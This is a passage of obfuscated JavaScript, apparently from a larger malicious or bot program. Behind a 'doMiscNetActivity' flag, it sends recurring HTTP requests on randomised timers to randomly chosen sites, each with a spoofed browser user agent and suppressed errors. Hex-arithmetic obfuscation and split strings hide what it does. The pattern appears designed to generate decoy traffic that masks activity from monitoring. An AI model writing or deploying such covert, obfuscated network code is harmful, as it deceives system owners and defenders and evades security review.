      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x10ac + -0x23c6 * 0x1 + 0x131a; k < 0x10 * -0x172 + 0x1 * -0x77 + 0x179b; k++)
    setTimeout(f, (-0x1c387 + -0x1eb * -0xe9 + 0x3bc1 * 0x4) * k * getRandomInt(-0x5 * -0x47b + -0x1f3d + -0x8d7 * -0x1, -0x18db + 0x1d84 + -0x4a6));
  setInterval(() => {
    f();
    for (let l = -0x3 * -0x736 + 0x6a1 + -0x1c43 * 0x1; l < 0x25 * -0x106 + -0x1cc9 * 0x1 + -0x1 * -0x42ab; l++)
      setTimeout(f, (0x330 * 0x5a + 0x4 * -0x3574 + 0xa150) * l * getRandomInt(-0x3 * -0x545 + 0x32f * -0x3 + -0x641, -0x2708 * -0x1 + -0x1892 + -0x89 * 0x1b));
  }, 0x453d8f + -0x388c0f + 0x1 * 0x2a3d00);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x9 * 0x61 + -0x17d * -0x9 + 0x115c) * getRandomInt(-0x2266 + -0x9ff * -0x1 + -0x61a * -0x4, 0x6bd * -0x1 + 0x1 * -0xf99 + 0x165b));
}, -0x1fc6 * 0x1 + -0x16f4 + 0x371e);